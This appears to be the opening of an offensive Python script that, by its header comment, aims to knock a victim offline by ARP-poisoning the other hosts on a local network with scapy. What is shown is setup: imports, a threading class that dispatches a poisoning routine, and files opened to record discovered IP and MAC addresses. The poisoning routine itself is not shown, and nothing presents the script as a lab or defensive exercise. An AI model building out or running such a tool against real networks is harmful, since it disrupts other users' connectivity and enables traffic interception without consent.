#We will DOS a victim with ARP poisening on the other systems that exist in a network
#################################################################################


#This is the main module that we will use to craete a packets and send them
from scapy.all import *

#This is a module that we use to interact with python interpreter
import sys

#This is a module that we use to interact with the operation system that python is running on it
import os

#This is a module that  we use to get information like IP address from network adapter
import netifaces as lp

#This is a module that we use to create a more thread to use them in poisening operation
import threading

#This is a module that we use to create a delay time in exection of python code
import time




#Create a class for poisening operation
class poisenthreads(threading.Thread): 
	
	#overide the __init__ arguments with our arguments
	def __init__(self , vicmacadd , sysmac , alivesys ,j): 
		threading.Thread.__init__(self)
		self.vicmacadd=vicmacadd
		self.sysmac=sysmac
		self.alivesys=alivesys
		self.j=j

	#Define a function that we will use it to tell the new thread what to do
	def run(self):

		#It is a function that we will tell the threads to go on it for poisening
		poisenop(self.vicmacadd , self.sysmac , self.alivesys , self.j)






#The alive systems addressess will store is in this file
result=open("/root/Desktop/ipaddress.txt" , 'w+') #create a writeable file
result2=open("/root/Desktop/macaddress.txt" , 'w+') #create a writeable file 

#It is a list variable that we will use to store the alive systems IP address in the network after checksys function
alivesys=[] 

#It is a list variable that we will use to store the MAC address of the Alive systems in network after check systems MAC operation
sysmac=[]   



	
	
	













